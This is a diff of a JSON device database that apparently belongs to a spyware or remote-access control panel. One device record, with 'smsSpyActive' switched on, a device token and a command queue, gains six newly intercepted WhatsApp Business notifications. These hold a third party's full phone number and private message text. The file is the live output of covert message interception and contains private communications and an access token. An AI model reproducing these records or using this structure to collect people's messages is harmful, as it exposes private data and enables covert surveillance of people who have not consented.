@@ -18141,7 +18141,7 @@
     "deviceName": "HP-ZAL7SEX-67C3",
     "ownerUsername": "Zal7Sex",
     "token": "228585cf435485e2101335e5900a661b",
-    "lastSeen": 1777502017734,
+    "lastSeen": 1777502038761,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T16:01:38.130Z",
@@ -18157,6 +18157,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎5 pesan dari 2 chat",
+        "time": "30/04 05:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777502020481
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 858-1567-7915",
+        "content": "Pishing yang mana ya?",
+        "time": "30/04 05:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777502020464
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎4 pesan dari 2 chat",
+        "time": "30/04 05:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777502019668
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 858-1567-7915",
+        "content": "Zal",
+        "time": "30/04 05:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777502019653
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎3 pesan dari 2 chat",
+        "time": "30/04 05:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777502019249
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 858-1567-7915",
+        "content": "Assalamu'alaikum",
+        "time": "30/04 05:33",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777502019233
+      },
       {
         "appName": "WA Business",
         "sender": "kyora",
